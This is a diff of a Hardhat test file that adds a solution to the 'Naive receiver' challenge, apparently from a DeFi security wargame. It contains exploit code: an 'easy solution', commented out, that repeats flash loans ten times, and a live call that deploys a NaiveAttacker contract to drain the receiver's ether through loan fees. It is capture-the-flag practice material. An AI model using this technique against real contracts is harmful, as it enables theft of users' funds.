@@ -38,6 +38,30 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const blockBefore = await ethers.provider.getBlockNumber("latest");
+        console.log("Block before: ", blockBefore);
+
+
+        // Easy solution
+        // Take out 10 flash loans
+        // for (let i = 0; i < 10; i++) {
+        //     await pool.flashLoan(
+        //         receiver.address,
+        //         await pool.ETH(),
+        //         ETHER_IN_RECEIVER,
+        //         "0x"
+        //     )
+        // }
+
+        // Hard solution
+        // Deploy a contract that will call the receiver contract 10 times in one transaction
+        const attackerFactory = await ethers.getContractFactory('NaiveAttacker', deployer);
+        const attacker = await attackerFactory.deploy();
+        await attacker.attack(pool.address, receiver.address, ETHER_IN_RECEIVER, await pool.ETH());
+        
+        
+        const blockAfter = await ethers.provider.getBlockNumber("latest");
+        console.log("Block after: ", blockAfter);
     });
 
     after(async function () {
